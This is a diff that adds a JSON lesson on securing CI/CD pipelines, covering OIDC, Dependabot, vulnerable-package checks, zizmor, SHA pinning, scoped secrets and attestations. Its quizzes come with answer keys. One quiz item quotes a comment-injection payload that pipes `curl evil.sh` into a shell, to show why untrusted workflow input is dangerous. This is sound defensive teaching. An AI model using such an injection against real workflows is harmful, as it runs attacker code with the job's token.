@@ -1,0 +1,98 @@
+{
+  "title": "Senior's toolkit: a pipeline you can trust",
+  "summary": "OIDC instead of stored cloud keys, Dependabot, vulnerable package checks, workflow audits, pinned actions, environment secrets and attestations.",
+  "minutes": 8,
+  "kind": "lesson",
+  "steps": [
+    {
+      "type": "learn",
+      "title": "Senior's toolkit: a pipeline you can trust",
+      "body": "A pipeline holds the keys to production, so attackers aim at it. These commands and keys remove long-lived secrets, keep dependencies patched and prove what you built.",
+      "toolkit": [
+        { "cmd": "permissions: id-token: write", "what": "Lets the job ask GitHub for a short-lived OIDC token that the cloud trusts, instead of storing a cloud key as a secret. Nothing long-lived can leak.",
+          "flags": [["id-token: write", "allow requesting the OIDC token"], ["contents: read", "keep everything else minimal"], ["subject claim", "the cloud trusts e.g. `repo:shop/api:environment:production` only"]],
+          "example": "permissions:\n  id-token: write\n  contents: read\nsteps:\n  - uses: azure/login@v2\n    with:\n      client-id: ${{ vars.AZURE_CLIENT_ID }}\n      tenant-id: ${{ vars.AZURE_TENANT_ID }}\n      subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}", "lang": "yaml" },
+        { "cmd": ".github/dependabot.yml", "what": "Dependabot opens pull requests for outdated or vulnerable dependencies. Include `github-actions` so your actions get updated too.",
+          "flags": [["package-ecosystem", "`nuget`, `npm`, `docker`, `github-actions`"], ["schedule.interval", "`daily`, `weekly`, `monthly`"], ["groups:", "bundle minor and patch bumps into one PR"]],
+          "example": "version: 2\nupdates:\n  - package-ecosystem: nuget\n    directory: /\n    schedule:\n      interval: weekly\n  - package-ecosystem: github-actions\n    directory: /\n    schedule:\n      interval: weekly", "lang": "yaml" },
+        { "cmd": "dotnet package list --vulnerable --include-transitive", "what": "Lists packages with known advisories, including the ones you pull in indirectly. (.NET 10 form; older SDKs use `dotnet list package --vulnerable`.)",
+          "flags": [["--vulnerable", "only packages with advisories"], ["--include-transitive", "dependencies of dependencies, where most issues hide"], ["--format json", "output for scripts"]],
+          "example": "dotnet package list --vulnerable --include-transitive", "lang": "bash" },
+        { "cmd": "zizmor .github/workflows", "what": "A security linter for workflows: script injection from `${{ github.event... }}`, `pull_request_target` misuse, unpinned actions, too-wide permissions.",
+          "flags": [["<path>", "a workflow file or folder"], ["--format sarif", "upload results to code scanning"]],
+          "example": "zizmor .github/workflows", "when": "on every PR that changes a workflow", "lang": "bash" },
+        { "cmd": "uses: owner/action@<full-commit-sha> # vX.Y.Z", "what": "Pins a third-party action to an exact commit. A tag can be moved to malicious code; a SHA cannot. The comment lets Dependabot and humans see the version.",
+          "flags": [["@<40-char sha>", "immutable"], ["# v2.3.1", "the version the SHA belongs to"]],
+          "example": "- uses: some-org/deploy-action@<40-char-commit-sha> # v2.3.1", "lang": "yaml" },
+        { "cmd": "gh secret set <NAME> --env <environment>", "what": "Stores a secret for one environment only, so only jobs that deploy there (after approval) can read it. Reads the value from stdin, keeping it out of shell history.",
+          "flags": [["--env production", "scope to an environment"], ["--repo owner/repo", "a different repository"], ["< file", "value from a file instead of `--body`"]],
+          "example": "gh secret set DB_PASSWORD --env production < db-password.txt", "lang": "bash" },
+        { "cmd": "gh attestation verify <artifact> --owner <org>", "what": "Checks that an artifact or image was built by your workflow (signed build provenance), before you deploy it.",
+          "flags": [["oci://ghcr.io/...", "verify a container image"], ["--owner shop", "trust attestations from this organisation"], ["--repo shop/api", "or only from this repository"]],
+          "example": "gh attestation verify oci://ghcr.io/shop/api:1.4.0 --owner shop", "lang": "bash" }
+      ]
+    },
+    {
+      "type": "mcq",
+      "prompt": "A security review finds `AZURE_CLIENT_SECRET` stored as a repository secret, two years old, used by the deploy job. What is the best fix?",
+      "options": [
+        "Switch to OIDC: a federated credential for the environment, `permissions: id-token: write`, `azure/login` with client, tenant and subscription ids; then delete the secret",
+        "Rotate the secret every year",
+        "Move it to an organisation secret",
+        "Base64-encode it"
+      ],
+      "answer": 0,
+      "explain": "With OIDC the job gets a token that lives for minutes and only works for the subject the cloud trusts. There is no stored credential left to leak or rotate."
+    },
+    {
+      "type": "match",
+      "prompt": "Match the tool to the risk it covers.",
+      "pairs": [
+        ["`permissions: id-token: write` + OIDC", "a leaked long-lived cloud key"],
+        ["`dependabot.yml`", "dependencies that silently go out of date"],
+        ["`dotnet package list --vulnerable --include-transitive`", "a known CVE in an indirect package"],
+        ["`zizmor`", "script injection in a workflow"],
+        ["`@<commit-sha>` pins", "an action's tag moved to malicious code"],
+        ["`gh attestation verify`", "deploying an image nobody can trace to your build"]
+      ]
+    },
+    {
+      "type": "blanks",
+      "prompt": "Find vulnerable packages, including indirect ones.",
+      "code": "dotnet package __1__ --__2__ --__3__",
+      "blanks": ["list", "vulnerable", "include-transitive"],
+      "bank": ["search", "outdated", "deprecated", "audit"],
+      "explain": "`--outdated` and `--deprecated` are real flags too, but they answer different questions. Advisories in transitive packages only show with `--include-transitive`."
+    },
+    {
+      "type": "mcq",
+      "prompt": "`zizmor` flags this step in a workflow triggered by `issue_comment`: `run: echo \"${{ github.event.comment.body }}\"`. Why is it dangerous?",
+      "options": [
+        "The expression is pasted into the script before it runs, so a comment like `\"; curl evil.sh | sh; \"` runs as code with the job's token",
+        "Comments can be too long for `echo`",
+        "It needs `permissions: issues: read`",
+        "`echo` is not available on the runner"
+      ],
+      "answer": 0,
+      "explain": "Pass untrusted values through an environment variable instead: `env: BODY: ${{ github.event.comment.body }}` and `run: echo \"$BODY\"`. Then the shell treats it as data."
+    },
+    {
+      "type": "sort",
+      "prompt": "Where does each control act?",
+      "buckets": ["Workflow file", "Repository or org settings", "A command you run"],
+      "items": [
+        ["`permissions: contents: read`", 0],
+        ["Actions pinned to commit SHAs", 0],
+        ["Required reviewers on the production environment", 1],
+        ["Environment-scoped secrets", 1],
+        ["`zizmor .github/workflows`", 2],
+        ["`gh attestation verify`", 2]
+      ]
+    },
+    {
+      "type": "learn",
+      "title": "Make it a habit",
+      "body": "In every new pipeline: default `contents: read`, OIDC for cloud access, secrets scoped to environments, actions pinned by SHA and Dependabot to keep them current. Run `zizmor` and the vulnerable-package check in CI so nobody has to remember."
+    }
+  ]
+}
